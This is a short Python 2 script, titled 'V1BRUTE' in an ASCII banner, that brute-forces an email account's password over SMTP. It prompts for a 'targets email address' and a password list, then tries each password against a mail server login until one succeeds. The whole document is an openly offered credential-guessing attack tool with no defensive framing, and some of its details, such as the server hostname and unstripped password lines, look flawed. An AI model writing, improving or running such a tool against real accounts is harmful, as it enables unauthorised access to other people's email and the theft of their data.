import smtplib


print('''
===================================================================
____   ____________________________ ____ _________________________
\   \ /   /_   \______   \______   \    |   \__    ___/\_   _____/
 \   Y   / |   ||    |  _/|       _/    |   / |    |    |    __)_ 
  \     /  |   ||    |   \|    |   \    |  /  |    |    |        \
   \___/   |___||______  /|____|_  /______/   |____|   /_______  /
                       \/        \/                            \/ 
===================================================================
''')

smtpserver = smtplib.SMTP("smtp.google.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the targets email address: ")

pwfile = raw_input("password file: ")
pwfile = open(pwfile, "r")


for password in pwfile:
    try:
        smtpserver.login(user, password)
        print "[+] Password Found %s" % password
        break;
        
    except smtplib.SMTPAuthenticationError:
        print "[!] Pass incorrect get a good password file u dummy %s" % password
